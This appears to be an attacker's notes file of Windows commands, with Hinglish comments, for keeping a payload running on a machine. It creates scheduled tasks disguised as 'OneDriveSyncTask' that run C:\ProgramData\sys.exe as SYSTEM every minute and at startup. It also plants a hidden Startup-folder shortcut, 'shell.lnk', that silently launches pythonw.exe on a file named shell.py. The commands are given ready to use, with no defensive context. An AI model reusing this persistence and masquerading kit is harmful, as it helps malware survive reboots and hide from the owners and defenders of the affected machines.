:: Har 1 minute
schtasks /create /tn "OneDriveSyncTask" /tr "C:\ProgramData\sys.exe" /sc minute /mo 1 /ru SYSTEM /f

:: Startup pe bhi
schtasks /create /tn "OneDriveSyncTask2" /tr "C:\ProgramData\sys.exe" /sc onstart /ru SYSTEM /f

::run task instant
schtasks /run /tn "OneDriveSyncTask"

::delete task 
schtasks /delete /tn "OneDriveSyncTask" /f

::check task 
schtasks /query /tn "OneDriveSyncTask" /fo LIST /v

::CreateObject("Wscript.Shell").Run "python ""C:\path\to\your\script.py""", 0, True




$Wsh = New-Object -ComObject WScript.Shell
$s = $Wsh.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\shell.lnk")
$s.TargetPath = "pythonw.exe"
$s.Arguments = "C:\ProgramData\shell.py"
$s.WindowStyle = 7
$s.Save()
